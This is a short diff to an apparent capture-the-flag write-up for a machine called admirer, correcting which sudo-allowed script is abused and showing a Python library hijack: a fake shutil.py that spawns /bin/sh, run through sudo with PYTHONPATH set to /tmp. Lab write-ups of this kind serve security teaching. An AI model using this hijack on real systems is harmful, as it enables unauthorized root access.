@@ -114,15 +114,15 @@ sudo -l
 
 ```text
 User waldo may run the following commands on admirer:
-    (ALL) SETENV: NOPASSWD: /opt/scripts/backup.py
+    (ALL) SETENV: NOPASSWD: /opt/scripts/admin_tasks.sh
 ```
 
-`SETENV` is the key: it allows environment variables to be passed to the privileged process. The script does `import shutil`, and Python resolves modules from `PYTHONPATH` before the standard library.
+`SETENV` is the key: it allows environment variables to be passed to the privileged process. The rule targets `admin_tasks.sh`, not `backup.py`; option 6 of its menu runs `backup.py`, which does `import shutil`, and Python resolves modules from `PYTHONPATH` before the standard library.
 
 ```bash
 cat /opt/scripts/backup.py        # import shutil, make_archive(...)
 echo 'import os; os.system("/bin/sh")' > /tmp/shutil.py
-sudo PYTHONPATH=/tmp /opt/scripts/backup.py
+sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh   # option 6
 ```
 
 ```text
